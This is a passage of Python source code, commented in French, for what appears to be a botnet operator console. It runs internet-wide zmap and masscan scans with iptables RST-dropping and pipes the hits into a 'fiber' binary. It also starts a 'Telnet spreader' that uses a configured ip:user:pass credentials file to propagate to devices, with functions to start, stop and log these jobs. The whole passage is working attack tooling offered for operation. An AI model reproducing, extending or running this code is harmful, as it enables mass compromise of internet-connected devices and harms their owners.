                "  fi; "
                "done"
            )

            # Collecteur simple (sans filtre InternetDB)
            collect = (
                f"while IFS= read -r ip; do "
                f"echo \"$ip\" > {current_file}; "
                f"echo \"$ip\" >> {found_file}; "
                f"echo \"$ip\"; "
                f"done"
            )

            iptables_up   = "sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP 2>/dev/null"
            iptables_down = f"sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP 2>/dev/null; echo \"[*] iptables nettoyé\" >> {log_file}"
            prefix = (
                f"ulimit -n 999999; {iptables_up}; "
                f"trap '{iptables_down}' EXIT; "
                f"rm -f {found_file} {current_file}; touch {found_file}; "
            )

            if src_choice in ('1', '7'):   # zmap seul / CIDR via zmap
                return (
                    f"{prefix}"
                    f"echo '[*] zmap port {port}' | tee {log_file}; "
                    f"{zmap_cmd} 2>>{log_file} | {collect} | {fiber_cmd} 2>&1 | tee -a {log_file}; "
                    f"echo '[*] Terminé.' >> {log_file}"
                )
            elif src_choice == '2':        # masscan seul
                return (
                    f"{prefix}"
                    f"echo '[*] masscan port {port}' | tee {log_file}; "
                    f"{masscan_cmd} 2>>{log_file} | {collect} | {fiber_cmd} 2>&1 | tee -a {log_file}; "
                    f"echo '[*] Terminé.' >> {log_file}"
                )
            elif src_choice == '3':        # zmap + masscan en parallèle
                return (
                    f"{prefix}"
                    f"echo '[*] zmap+masscan port {port}' | tee {log_file}; "
                    f"{{ {zmap_cmd} 2>>{log_file} & {masscan_cmd} 2>>{log_file}; wait; }} | sort -u | {collect} | {fiber_cmd} 2>&1 | tee -a {log_file}; "
                    f"echo '[*] Terminé.' >> {log_file}"
                )
            elif src_choice == '5':        # zmap + InternetDB filtre
                return (
                    f"{prefix}"
                    f"echo '[*] zmap+InternetDB port {port}' | tee {log_file}; "
                    f"{zmap_cmd} 2>>{log_file} | {idb_filter} | {fiber_cmd} 2>&1 | tee -a {log_file}; "
                    f"echo '[*] Terminé.' >> {log_file}"
                )
            elif src_choice == '6':        # masscan + InternetDB filtre
                return (
                    f"{prefix}"
                    f"echo '[*] masscan+InternetDB port {port}' | tee {log_file}; "
                    f"{masscan_cmd} 2>>{log_file} | {idb_filter} | {fiber_cmd} 2>&1 | tee -a {log_file}; "
                    f"echo '[*] Terminé.' >> {log_file}"
                )
            return ""

        def run_all_batches():
            batches = [ports[i:i+BATCH] for i in range(0, len(ports), BATCH)]
            for idx, batch in enumerate(batches):
                if self._scan_stop:
                    break
                cprint(f"\n  {C.CYAN}[Vague {idx+1}/{len(batches)}]{C.RESET} Ports : {', '.join(batch)}", C.CYAN)
                for port in batch:
                    inner = make_inner(port)
                    subprocess.run(['screen', '-dmS', f'scanner_{port}', 'bash', '-c', inner])
                    cprint(f"  [+] scanner_{port} démarré  ({rate_per_port} pps)", C.GREEN)
                if idx < len(batches) - 1:
                    while any(self._screen_running(f'scanner_{p}') for p in batch):
                        if self._scan_stop:
                            return
                        time.sleep(5)
                    cprint(f"  [✓] Vague {idx+1} terminée — lancement vague suivante...", C.GREEN)

        import threading
        self._scan_stop = False
        threading.Thread(target=run_all_batches, daemon=True).start()
        time.sleep(2)

        if use_lst and not cidr_target:
            cprint(f"  [+] Cibles : all.lst ({lst_count} IPs)", C.GREEN)
        elif cidr_target:
            cprint(f"  [+] Cibles : {cidr_target}", C.GREEN)
        cprint(f"\n  [i] Lister les screens : screen -ls", C.CYAN)
        cprint(f"  [i] Attacher un screen  : screen -r scanner_<port>", C.CYAN)
        cinput("  > Entrée...")

    def _kill_all_scans(self):
        """Tue tous les screens de scan (scanner_*, idb_*, imp_*) + zmap/masscan/fiber."""
        self._scan_stop = True
        cmds = [
            # Fermer tous les screens de scan (scanner_*, idb_*, imp_*)
            "for s in $(screen -ls | grep -oE '[0-9]+\\.(scanner|idb|imp)_[^ ]+'); do screen -S \"$s\" -X quit; done",
            # Tuer zmap (root)
            "sudo kill -9 $(pgrep -f zmap) 2>/dev/null || true",
            # Tuer masscan (root)
            "sudo kill -9 $(pgrep -f masscan) 2>/dev/null || true",
            # Tuer fiber
            "kill -9 $(pgrep -f './fiber') 2>/dev/null || true",
            # Nettoyer iptables RST
            "sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP 2>/dev/null || true",
        ]
        for cmd in cmds:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _stop_fiber(self):
        # Lister les screens actifs avant de tuer pour afficher ce qu'on arrête
        _, screens_out = run(['screen', '-ls'], capture=True)
        active = []
        import re as _re
        for line in screens_out.splitlines():
            m = _re.search(r'\d+\.((scanner|idb|imp)_\S+)', line)
            if m and 'Dead' not in line and 'dead' not in line:
                active.append(m.group(1))
        self._kill_all_scans()
        if active:
            for name in active:
                cprint(f"  [+] {name} arrêté", C.GREEN)
        else:
            ports = [p.strip() for p in (self.cfg.scan_ports or '23,80,8080').split(',') if p.strip()]
            for port in ports:
                cprint(f"  [+] scanner_{port} arrêté", C.GREEN)
        cinput("  > Entrée...")

    def _stop_all(self):
        self._kill_all_scans()
        # Aussi tuer le spreader telnet si actif
        subprocess.run("screen -S telnet_spread -X quit 2>/dev/null", shell=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cprint("  [+] Tout arrêté (screens + zmap + fiber + iptables).", C.GREEN)
        cinput("  > Entrée...")

    def _start_telnet_spread(self):
        if not Path('fiber').exists():
            cprint("  [!] fiber introuvable. Lance BUILD d'abord.", C.RED)
            cinput("  > Entrée..."); return
        tc = self.cfg.telnet_creds.strip()
        if not tc:
            cprint("  [!] Aucun fichier de creds configuré.", C.RED)
            cprint("  [i] Va dans Configuration > [t] pour définir le fichier ip:user:pass.", C.CYAN)
            cinput("  > Entrée..."); return
        if not Path(tc).exists():
            cprint(f"  [!] Fichier introuvable : {tc}", C.RED)
            cinput("  > Entrée..."); return

        if self._screen_running('telnet_spread'):
            cprint("  [!] Spreader Telnet déjà actif.", C.YELLOW)
            cinput("  > Entrée..."); return

        log_file = '/tmp/telnet_spread.log'
        pid_file = '/tmp/telnet_spread.pid'
        cmd = f"./fiber telnet {tc} >> {log_file} 2>&1; rm -f {pid_file}"
        os.system(f"screen -dmS telnet_spread bash -c '{cmd}'")
        # Stocker le PID de fiber dès qu'il apparaît
        import time as _t; _t.sleep(1)
        os.system(f"pgrep -f 'fiber telnet' > {pid_file} 2>/dev/null")
        cprint(f"  [+] Spreader Telnet démarré (screen: telnet_spread)", C.GREEN)
        cprint(f"  [i] Logs : {log_file}", C.CYAN)
        cinput("  > Entrée...")

    def _stop_telnet_spread(self):
        pid_file = '/tmp/telnet_spread.pid'
        cmds = [
            # Tuer par PID stocké au démarrage
            f"xargs kill -9 < {pid_file} 2>/dev/null || true",
            # Fallback pgrep
            "kill -9 $(pgrep -f 'fiber telnet') 2>/dev/null || true",
            # Tuer le screen + le shell bash dedans
            "screen -S telnet_spread -X stuff $'\\003'",   # Ctrl+C
            "screen -S telnet_spread -X quit",
            # Dernier recours
            "pkill -9 -x fiber 2>/dev/null || true",
        ]
        for cmd in cmds:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(f"rm -f {pid_file}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run("screen -wipe 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cprint("  [+] Spreader Telnet arrêté.", C.GREEN)
        cinput("  > Entrée...")

    def _show_telnet_log(self):
        log_file = '/tmp/telnet_spread.log'
        if not Path(log_file).exists():
            cprint("  [!] Pas encore de log Telnet.", C.YELLOW)
            cinput("  > Entrée..."); return
        clear()
        header("TELNET SPREAD — LOG")
        lines = Path(log_file).read_text(errors='replace').splitlines()
        for l in lines[-40:]:
            cprint(f"  {l}", C.WHITE)
        cinput("\n  > Entrée...")


if __name__ == '__main__':
    try:
        Builder().run()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}  Bye.{C.RESET}")
        sys.exit(0)
